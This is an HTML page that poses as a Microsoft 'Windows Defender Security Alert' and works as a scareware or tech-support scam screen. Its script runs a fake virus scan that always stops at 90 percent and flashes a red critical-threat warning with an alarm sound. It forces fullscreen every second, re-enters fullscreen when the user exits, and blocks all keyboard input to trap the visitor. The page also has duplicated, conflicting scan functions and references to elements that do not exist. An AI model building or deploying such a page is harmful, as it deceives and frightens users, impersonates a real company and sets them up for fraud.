<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Windows Defender Security Alert</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: blue;
            color: white;
            text-align: center;
            overflow: hidden;
        }

        .logo {
            margin-top: 20px;
            width: 150px;
        }

        .menu {
            display: flex;
            justify-content: center;
            gap: 30px;
            background: rgba(0, 0, 0, 0.7);
            padding: 15px;
        }

        .menu a {
            color: white;
            text-decoration: none;
            font-size: 18px;
            font-weight: bold;
        }

        .scan-now {
            font-size: 24px;
            font-weight: bold;
            padding: 20px 40px;
            background: blue;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .scan-now:hover {
            background: green;
        }

        .scan-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.9);
            padding: 30px;
            border-radius: 10px;
            width: 500px;
            box-shadow: 0px 4px 15px rgba(0, 0, 255, 0.5);
            backdrop-filter: blur(10px);
            display: none;
            color: white;
        }

        .progress-bar {
            width: 100%;
            background: #222;
            border-radius: 5px;
            margin-top: 20px;
            height: 20px;
            position: relative;
        }

        .progress-fill {
            width: 0%;
            height: 100%;
            background: limegreen;
            border-radius: 5px;
            transition: width 0.5s;
        }

        .critical-warning, .error-popup {
            display: none;
            position: fixed;
            background: darkred;
            color: white;
            padding: 30px;
            border-radius: 10px;
            width: 80%;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            box-shadow: 0px 0px 15px red;
            z-index: 9999;
            animation: flash 1s infinite alternate;
        }

        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            background: rgba(0, 0, 0, 0.7);
            padding: 10px;
            text-align: center;
            color: white;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="menu">
        <a href="#">Microsoft Support</a>
        <a href="#">Store</a>
        <a href="#">Security</a>
        <a href="#">Help Center</a>
    </div>
	<!-- Audio Player (hidden) -->
        <audio id="warning-sound" src="microsoft_warning.mp3" type="audio/mp3"></audio>
        <script>
            function enforceFullScreen(event) {
                event.preventDefault();
                if (!document.fullscreenElement) {
                    document.documentElement.requestFullscreen();
                }
            }

            function startScan() {
                let progressBar = document.getElementById('progress-bar');
                let errorMessage = document.getElementById('error-message');
                let scanStatus = document.querySelector('.scan-status');
                let warningSound = document.getElementById('warning-sound');
                let progress = 0;
                let interval = setInterval(() => {
                    progress += 10;
                    progressBar.style.width = progress + '%';
                    scanStatus.innerText = `Scanning... ${progress}%`;
                    if (progress >= 90) {
                        progressBar.style.background = '#D32F2F';
                        errorMessage.style.display = 'block';
                        warningSound.play();
                        clearInterval(interval);
                    }
                }, 500);
            }
        </script>

    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="logo" alt="Microsoft Logo">
    <button class="scan-now" onclick="startScan()">Scan Now</button>
    <div class="scan-container" id="scanContainer">
        <div class="scan-title">Windows Defender Security Scan</div>
        <p id="scan-status">Initializing scan...</p>
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
    </div>
    <div class="critical-warning" id="criticalWarning">
        ⚠ CRITICAL SECURITY WARNING! ⚠ <br>
        A severe threat has been detected. Immediate action required!
    </div>
    <div class="footer">
        © 2025 Microsoft Corporation. All rights reserved.
    </div>
    <script>
        function startScan() {
            enforceFullScreen();
            document.querySelector('.scan-now').style.display = 'none';
            document.getElementById('scanContainer').style.display = 'block';
            let scanProgress = 0;
            let scanInterval = setInterval(() => {
                scanProgress += 10;
                if (scanProgress > 90) {
                    scanProgress = 90;
                    document.getElementById("progressFill").style.background = "red";
                    clearInterval(scanInterval);
                    triggerErrorPopups();
                }
                document.getElementById("progressFill").style.width = scanProgress + "%";
                document.getElementById("scan-status").textContent = scanProgress + "% Complete";
            }, 1500);
        }

        function enforceFullScreen() {
            let elem = document.documentElement;
            if (!document.fullscreenElement) {
                if (elem.requestFullscreen) {
                    elem.requestFullscreen();
                } else if (elem.mozRequestFullScreen) {
                    elem.mozRequestFullScreen();
                } else if (elem.webkitRequestFullscreen) {
                    elem.webkitRequestFullscreen();
                } else if (elem.msRequestFullscreen) {
                    elem.msRequestFullscreen();
                }
            }
        }

        function triggerErrorPopups() {
            document.getElementById("criticalWarning").style.display = "block";
            setInterval(() => {
                enforceFullScreen();
            }, 1000);
        }

        document.addEventListener("keydown", function(event) {
            event.preventDefault();
        });

        document.addEventListener("fullscreenchange", function() {
            if (!document.fullscreenElement) {
                enforceFullScreen();
            }
        });
    </script>
</body>
</html>
